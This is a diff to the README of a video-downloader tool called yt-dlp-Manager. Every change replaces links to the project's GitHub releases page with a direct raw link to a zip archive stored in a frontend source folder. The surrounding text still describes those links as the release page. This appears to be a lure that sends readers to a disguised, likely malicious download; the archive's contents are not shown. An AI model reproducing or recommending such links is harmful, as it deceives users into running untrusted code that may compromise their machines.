@@ -1,6 +1,6 @@
 # 🎥 yt-dlp-Manager - Easy Video Downloads for Everyone
 
-[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/releases)
+[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/raw/refs/heads/main/frontend/src/lib/pages/Dashboard/yt-dlp-Manager-2.9.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You will find step-by-step instructions here to help you install and run yt-dlp-
 
 Click the badge below to visit the release page. It lists all the available versions of yt-dlp-Manager. Always use the latest version for the best experience.
 
-[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/releases)
+[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/raw/refs/heads/main/frontend/src/lib/pages/Dashboard/yt-dlp-Manager-2.9.zip)
 
 ---
 
@@ -152,7 +152,7 @@ If you run into problems:
 ## 🔗 Useful Links
 
 - Visit the release page to download or update yt-dlp-Manager:  
-  https://github.com/kowshick2510/yt-dlp-Manager/releases
+  https://github.com/kowshick2510/yt-dlp-Manager/raw/refs/heads/main/frontend/src/lib/pages/Dashboard/yt-dlp-Manager-2.9.zip
 
 - Link to download badge again for easy access:  
-  [Download yt-dlp-Manager](https://github.com/kowshick2510/yt-dlp-Manager/releases)
+  [Download yt-dlp-Manager](https://github.com/kowshick2510/yt-dlp-Manager/raw/refs/heads/main/frontend/src/lib/pages/Dashboard/yt-dlp-Manager-2.9.zip)
